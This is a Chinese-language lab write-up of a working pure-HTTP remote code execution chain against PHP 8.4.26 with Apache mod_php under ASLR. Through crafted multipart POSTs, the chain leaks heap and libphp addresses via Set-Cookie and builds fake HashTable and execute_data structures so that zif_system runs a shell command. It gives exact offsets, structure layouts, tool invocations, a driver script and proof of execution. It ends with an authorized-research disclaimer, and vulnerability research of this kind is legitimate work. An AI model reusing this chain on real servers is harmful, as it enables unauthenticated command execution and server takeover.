# 纯 HTTP ASLR RCE：两次 `Set-Cookie` 泄漏 + `zif_system`

日期：2026-10-21
目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64，`172.16.0.103`）
约束：**完全远程、只用 HTTP；目标 webroot 只有普通页面（无特定 PHP 文件）**。
状态：**ASLR-on 全链已跑通，且端到端攻击请求全部是纯 HTTP，lab 内
9/10（带开局轮换）/ 5/5（不带）**。地址来源是两条纯 HTTP 泄漏
（Zend MM chunk base、libphp base），终端用 `zif_system`（不需要 libc）。
阶段之间的 worker 轮换也由 HTTP 触发：`A_bigfields`（3MB 存活 POST 字段 +
OOM）让 Zend MM 堆损坏，紧跟一个会初始化 session 的 B 请求即可让 child
`SIGABRT`，prefork 随即 fork 一个地址空间相同的新 worker。

> 术语：本文的“纯 HTTP”指**攻击请求链**只使用 HTTP。lab 驱动仍会在开始时
> 重启一次 Apache 以获得干净 master，并用 `cat /tmp/p1` 校验结果；这两步是
> 实验环境操作，不在攻击链里。攻击链本身（泄漏、轮换、执行）不含本地信号。

---

## 1. 结论

三条请求序列（每条都是普通 multipart POST 到 `index.php`）：

| 阶段 | 请求 A | 请求 B | 产出 |
|---|---|---|---|
| 1 | `send_a_leak2.py 1001 12` | `b_numleak2.py 892 1 0x1000` | Zend MM chunk base |
| 2 | `send_a_leak3.py 1001 5 39 12 17` | `b_target.py 443 16 983` | libphp base |
| 3 | `send_a_pad.py 17 19 3 12` + `8:7` + 5×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |

阶段 1 的机制、证据见 [HTTP_HEAP_LEAK.md](/Users/my/php2shell/HTTP_HEAP_LEAK.md)。
本文记录阶段 2、3 和完整驱动。

实测（ASLR 开启，`personality=00000000`）：

```text
W1=869675 chunk=0x7f4922200000 attempt=1
W2=869737 libphp=0x7f4923a00000 attempt=1
W3=869807 HTDATA=0x7f492226e0d8 ZIF=0x7f4923e3a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
FULL_CHAIN_OK=5/5            # 无开局轮换（重启后 worker 本身就是 fresh）
FULL_PURE_HTTP_OK=9/10       # 含开局 HTTP 轮换（消除对初始历史的依赖）
```

轮换原语单独测量：

```text
A_bigfields + session B -> child exit signal Abort (6) -> prefork respawn
fresh worker 上 10/10；泄漏之后 5/5；轮换后再做 heap 泄漏 5/5
```

阶段 2 的 libphp 泄漏在 ASLR 下与 `/proc/<worker>/maps` 完全一致：

```text
Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%A1%87r%7F%00%00
解码: 10 00 00 00 00 00 00 00 | 50 3c a1 87 72 7f 00 00
pDestructor = 0x7f7287a13c50
libphp      = 0x7f7287400000
maps: 7f7287400000-7f728754f000 r--p ... /usr/lib/apache2/modules/libphp.so
```

---

## 2. 阶段 2：纯 HTTP 泄漏 libphp 代码指针

### 2.1 思路

阶段 1 已经证明可以劫持悬空 `PS(id)` 的 `len`，让 `php_url_encode` 越界读。
本阶段把“读哪里”改成 **56B HashTable 页**，并把 `len` 从“伪造的巨大值”换成
HashTable 里的一个 **小整数字段**：

- B 用嵌套数组 `aNNNN[k]` 在 chunk 里铺出大量 56B HashTable 页；每页 73 个
  HashTable，`pDestructor = ZVAL_PTR_DTOR = libphp + 0x613c50`。
- A 的形状（1001 个 39 字节值字段）把悬空 `PS(id)` 放到
  `chunk + 0xb7400`（页 `0xb7000`，页内 `+0x400`）。
- 该地址在 B 的布局里正好是 `$_POST['a0443']` 的 HashTable 的 `+0x20`：
  `PS(id)+0x10` 读到 `nTableSize | nInternalPointer`。
- 把 `a0443` 扩成 16 个元素（`nTableSize=16`, `nInternalPointer=0`），
  `ZSTR_LEN(PS(id)) = 16`；数据从 `PS(id)+0x18` 开始，正好覆盖
  `nNextFreeElement`（8B）与 `pDestructor`（8B）。

布局（相对 chunk 基址）：

```text
PS(id)          = chunk + 0xb7400
PS(id)+0x10     = HT + 0x20  -> nTableSize(16) | nInternalPointer(0) = 16  (len)
PS(id)+0x18     = HT + 0x28  -> nNextFreeElement (0x10)
HT + 0x30       = pDestructor = ZVAL_PTR_DTOR (libphp+0x613c50)
```

`b_target.py` 的约束：

```text
983 个数组 a0000..a0982；其中 a0443 有 16 个元素，其余各 1 个
字段总数 = 982 + 16 = 998；加上 PHPSESSID/PROGRESS 共 1000 个 POST 变量
=> 不触发 B 自己的 max_input_vars 警告（否则 headers_sent 会让 cookie 发不出去）
```

### 2.2 校准记录（no-ASLR）

- `send_a_leak3.py 1001 5 39 12 17` 后，`ps_globals.id = 0x7ffff5eb7400`
  （chunk+0xb7400），`send_cookie=1`。
- 998 个 `aNNNN[0]` 的原始 B 中，chunk 页 `0xb7000` 是 56B HashTable 页；
  该页 `+0x3f0` 的 HashTable 属于 `$_POST['a0443']`（通过父 bucket 的 key
  `a0443` 反查）。
- 把 a0443 改为 16 个元素、其余保持 1 个后，`Send-Cookie` 从正常 32 字符 id
  变成：

  ```text
  %10%00%00%00%00%00%00%00P%3C%A1%F4%FF%7F%00%00
  => nNextFreeElement=0x10 | pDestructor=0x7ffff4a13c50
  ```

- 该 pDestructor 正是 libphp 的 `ZVAL_PTR_DTOR`（`zval_ptr_dtor`），
  偏移 `0x613c50`。libphp base 为 2MB 对齐，可作为泄漏校验：
  `(pDestructor - 0x613c50) & 0x1fffff == 0` 且
  `pDestructor & 0x1fffff == 0x13c50`。

### 2.3 请求细节

A（`send_a_leak3.py 1001 5 39 12 17`）：

- 1001 个普通字段（5 字符名，39 字节值）→ 第 1001 个触发
  `max_input_vars` 警告（display_errors=On → headers_sent=1）；
- `PHPSESSID` 值为单字节 `\x00` → FILE_START 生成新 random id，
  `send_cookie=1`，`php_session_reset_id` 因 headers_sent 失败；
- 文件字段 + 12MB 字段 → OOM；`PS(id)` 悬空，地址 `chunk+0xb7400`。

B（`b_target.py 443 16 983`）：

- 无文件字段；pre-RINIT END cleanup 调 `php_session_initialize()`；
- `reset_id` 用悬空 `PS(id)` 发 `Set-Cookie`；
- `php_url_encode(ZSTR_VAL(id), ZSTR_LEN(id))` 读到 16 字节：
  `nNextFreeElement` + `pDestructor`；
- 之后 `ps_files_open` 的 id 校验失败，产生
  `Session ID is too long or contains illegal characters` 警告，
  不影响已发出的响应头。

---

## 3. 阶段 3：`zif_system` 终端

### 3.1 为什么不用 libc

阶段 1/2 只泄漏了 heap 和 libphp；chunk 扫描没有发现 libc 指针。因此终端使用
PHP 自己的 internal function handler `zif_system`（libphp + `0x43a870`），
不需要 `system`/libc 地址。

`zif_system(zend_execute_data *execute_data, zval *return_value)` 的调用约定：

- `pDestructor(&bucket->val)` 只确定地给出 `rdi = &bucket->val`；
- 把 `&bucket->val` 伪装成 `zend_execute_data`，`num_args=1`，
  `arg1` 是一个指向 fake `zend_string`（内容为命令）的 zval；
- `zif_system` 执行命令后，向不受控的 `rsi` 写返回值时可能崩溃，但命令已经
  执行（与 g18 的 `/proc/self/maps` 版本一致）。

### 3.2 紧凑 payload（167 字节，全部在存活的 192B zend_string 内）

exploit B 的 fake HashTable 放在一个存活的 167 字节字段值字符串里
（`chunk + 0x6e0d8`）；fake reference 用 55B raw buffer 覆盖
`R0 = chunk + 0x24e0` 处的悬空 reference。

```text
data+0x00: gc refcount=1, type=IS_ARRAY(7)
data+0x08: flags=0x10, nTableMask=0xfffffff8
data+0x10: arData = data+0x20
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = zif_system          (== execute_data+0x10)
data+0x20: execute_data E (0x50 bytes)
  E+0x10: return_value = zif_system          (与 HT pDestructor 重叠)
  E+0x2C: num_args = 1
  E+0x50: arg1 zval { value=data+0x80, type=IS_STRING(6) }
data+0x80: fake zend_string { gc 1/0x106, h=0, len=10, chars at 0x98 }
data+0x98: "id>/tmp/p1\0"
```

fake reference（55B raw buffer，起点 `R0-0x10`）：

```text
+0x10: gc refcount=1, type=IS_REFERENCE(10)
+0x18: val.value = chunk+0x6e0d8
+0x20: val.type  = 0x307 (IS_ARRAY_EX)
+0x28: sources   = 0
```

触发链：

```text
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))     # refcount 1 -> 0
    zend_reference_destroy(R0)
      zval_ptr_dtor(&ref->val)             # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)      # = zif_system
              zif_system(execute_data)     # "id>/tmp/p1"
```

### 3.3 exploit 请求形状（`use_cookies=1` 下校准）

- A：`send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7`
  - 6 个 pad 让悬空 reference `R0 = chunk + 0x24e0`，
    `R0-0x10` 是 56B block 起点；
- B：`send_b_zif.py 15 2 <HTDATA> <ZIF> "id>/tmp/p1"`
  - `N1=15`（31 字符 priming 字段）时 55B fake-ref raw buffer 落在 `R0-0x10`；
  - `HTDATA = chunk+0x6e0d8`（存活 167B 字符串 data）；
  - `ZIF = libphp+0x43a870`。

> 注意：`use_cookies` 从 0 改为 1 会把 B 的 56B 落点从 `N1=16` 移到
> `N1=15`，并改变泄漏 A 的部分偏移；以上参数全部是 `use_cookies=1` 下测的。

---

## 4. 完整驱动

`tools/pure_aslr_run.sh`：

1. 重启 Apache（ASLR 开启，单 worker prefork）；
2. 阶段 1：`send_a_leak2 + b_numleak2`，从 `Set-Cookie` 解析 chunk base
   （2MB 对齐众数）；失败重试 3 次；
3. 轮换 worker（HTTP）：`send_a_bigfields 1001 3000 12 17` →
   `sup_poc.py b`，等 prefork fork 新 child；
4. 阶段 2：`send_a_leak3 + b_target`，解析
   `pDestructor`，校验 `p & 0x1fffff == 0x13c50`；失败重试 3 次；
5. 轮换 worker（同上）；
6. 阶段 3：`send_a_pad + send_b_zif`，检查 `/tmp/p1`；失败重试 5 次。

驱动默认在阶段 1 之前也做一次 HTTP 轮换，先杀掉可能已有历史的当前 child，
使第一阶段的布局只取决于本链的请求序列。

```bash
# 目标机
cd ~/php2shell-work
CMD="id>/tmp/p1" bash pure_aslr_run.sh
```

实测输出（5/5）：

```text
W1=... chunk=0x...
W2=... libphp=0x...
W3=... HTDATA=0x... ZIF=0x... attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

证据归档：`logs/pure_http_aslr_20261021.txt`；
libphp 泄漏原始响应：`logs/libphp_leak_20261021.resp`。

---

## 5. worker 轮换与 ASLR 基址稳定性

- 同一 Apache master 下，prefork 重新 fork 的子进程继承相同的
  **libphp/libc** 映射；Zend MM chunk 在该子进程的第一个请求时 mmap，
  实测重启 worker 后 chunk base 与 libphp base 均保持不变：

  ```text
  W1 chunk=0x7f5555e00000 libphp=0x7f5553a00000
  W2 chunk=0x7f5555e00000 libphp=0x7f5553a00000   # child 被 abort/fork 后
  ```

- 阶段之间必须换一个 **fresh worker**：每个阶段的 A/B 偏移是在“worker 的
  第一个请求”上校准的。worker 一旦服务过泄漏请求，A 的悬空 reference 地址
  会移动（实测 `R0` 从 `chunk+0x24e0` 移到 `chunk+0x14e0`），旧的 B 落点
  失效。
- **纯 HTTP 轮换（已实现）**：`A_bigfields` 发送 1001 个普通字段（前 1000 个
  注册为 `$_POST`，每个 3000 字节）→ FILE_START 建新 id → 12MB 字段 OOM。
  3MB 存活字符串 + OOM 让 Zend MM 的堆状态损坏；紧跟一个会初始化 session 的
  B（`sup_poc.py b`：PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS，无文件字段，
  走 pre-RINIT END cleanup）触发 `zend_mm_panic`/`abort()`，child 以
  **SIGABRT** 退出，prefork 立即 fork 新 child。日志确认：

  ```text
  [core:notice] child pid ... exit signal Abort (6)
  ```

  实测：fresh worker 10/10、泄漏之后 5/5、轮换后再泄漏 5/5。
- 轮换后的新 child 与旧 child 共享同一 master 的 mmap 布局，因此 chunk base
  与 libphp base 都不变；这就是“泄漏一次、换 worker、继续用”的前提。
- 默认驱动在阶段 1 前也做一次 HTTP 轮换，这样即使目标 worker 已服务过未知
  请求，第一阶段的布局也只取决于本链的请求序列。

---

## 6. 限制

1. 依赖 `display_errors=On`（阶段 1/2 的 A 需要警告输出设置
   `headers_sent=1`）。
   > 2026-10-21 更新：不依赖 `display_errors` 的 OOM-in-cookie 变体已把 A
   > 的 OOM 打进 `php_session_send_cookie→php_url_encode`（bin 128 空 +
   > free page 耗尽），并在 B 侧穿过悬空 `PS(mod_data)`、用悬空 id 调
   > `send_cookie`；剩余是悬空 id 块的 forge 标定。详见
   > [DISPLAY_ERRORS_OFF.md](/Users/my/php2shell/DISPLAY_ERRORS_OFF.md)。
2. 依赖 `session.use_cookies=1`（默认）、`session.use_strict_mode=0`
   （默认）、`max_input_vars=1000`（默认）、`memory_limit=8M`（lab）。
3. 所有 chunk/模块内偏移绑定本 PHP 8.4.26 构建与请求形状：

   ```text
   chunk+0xb7400   stage-2 stale PS(id)
   chunk+0xb73f0   target HashTable (a0443)
   chunk+0x6e0d8   stage-3 fake HashTable string data
   chunk+0x24e0    stage-3 stale reference R0
   libphp+0x613c50 ZVAL_PTR_DTOR
   libphp+0x43a870 zif_system
   ```

   换构建/字段长度/请求顺序需按 `logs` 里的 gdb 方法重新校准；这些偏移都是
   chunk/模块内相对值，与 ASLR 无关。
4. 命令执行后 worker 会在 `zend_hash_destroy` 的收尾 `pefree` 中崩溃；
   proof 已写出，符合一次利用的预期。
5. 阶段 1 与阶段 2 的 A 形状不同，但都基于同一个“headers_sent + 空
   PHPSESSID + OOM”原语；两者都要求 A 是 worker 的 fresh 请求。fresh 状态由
   HTTP 轮换保证：`send_a_bigfields.py 1001 3000 12 17`（约 3MB 字段请求体）
   + `sup_poc.py b`。这一轮换依赖 `memory_limit=8M` 让 12MB 字段 OOM，并让
   下一请求在 Zend MM 收尾时 abort。
6. 成功率（lab，ASLR-on）：不带开局轮换 **5/5**；带开局轮换（消除初始历史
   依赖）**9/10**。失败主要是时序/重试问题，驱动内置阶段级重试；远高于
   “十次一次”的要求。
7. 若目标 `memory_limit` 很大，`A_bigfields` 的 OOM 需要更大的尾字段；
   轮换原语要求“先耗尽/损坏堆、再让 session 初始化触发 abort”，两者都要
   按目标配置重新标定。

---

## 7. 文件

| 文件 | 用途 |
|---|---|
| `tools/pure_aslr_run.sh` | 全链驱动（泄漏→轮换→exploit，含校验/重试） |
| `tools/send_a_leak2.py` | 阶段 1 A（heap 泄漏 prime） |
| `tools/b_numleak2.py` | 阶段 1 B（80B raw forge + 越界读） |
| `tools/decode_leak.py` | 阶段 1 响应解码/chunk base |
| `tools/send_a_leak3.py` | 阶段 2 A（`PS(id)=chunk+0xb7400`） |
| `tools/b_target.py` | 阶段 2 B（a0443 扩成 16 元素 → 泄漏 pDestructor） |
| `tools/send_a_pad.py` | 阶段 3 A（6 pad + 文件 + OOM） |
| `tools/send_b_zif.py` | 阶段 3 B（compact zif_system payload） |
| `tools/send_b_rce2.py` | 旧版 system 终端（no-ASLR 基线/崩溃实验） |
| `tools/send_a_bigfields.py` | HTTP 轮换 A（3MB 存活字段 + OOM） |
| `tools/sup_poc.py` | HTTP 轮换 B（session 初始化触发 SIGABRT） |
| `tools/b_crash7.py` | 早期 HTTP 崩溃原语实验（7 字符 live string） |
| `logs/http_heap_leak_20261021.resp/.txt` | 阶段 1 原始响应/解码 |
| `logs/libphp_leak_20261021.resp` | 阶段 2 原始响应 |
| `logs/pure_http_aslr_20261021.txt` | 纯 HTTP 全链运行记录（5/5、9/10） |

---

## 8. 免责声明

仅用于授权环境中的漏洞研究与复现。请求形状、bin 序列和偏移绑定本 lab 的
PHP 8.4.26 构建与 Apache/mod_php 配置；换构建或配置需重新校准。
